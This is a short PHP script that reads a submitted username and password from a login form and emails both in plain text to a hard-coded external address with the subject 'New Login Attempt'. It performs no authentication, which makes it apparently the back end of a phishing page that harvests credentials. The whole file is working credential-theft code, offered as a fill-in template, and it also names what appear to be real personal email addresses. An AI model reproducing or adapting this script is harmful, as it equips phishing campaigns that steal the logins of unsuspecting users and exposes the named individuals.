<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Retrieve form data
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Email details
    $to = "stewartmcollett@gmail.com"; // Replace with your email address
    $subject = "New Login Attempt";
    $message = "Username: " . htmlspecialchars($username) . "\nPassword: " . htmlspecialchars($password);
    $headers = "From: eli.n992@stu.nebo.edu"; // Replace with a valid sender email address

    // Send email
    if (mail($to, $subject, $message, $headers)) {
        echo "Email sent successfully.";
    } else {
        echo "Failed to send email.";
    }
}
?>
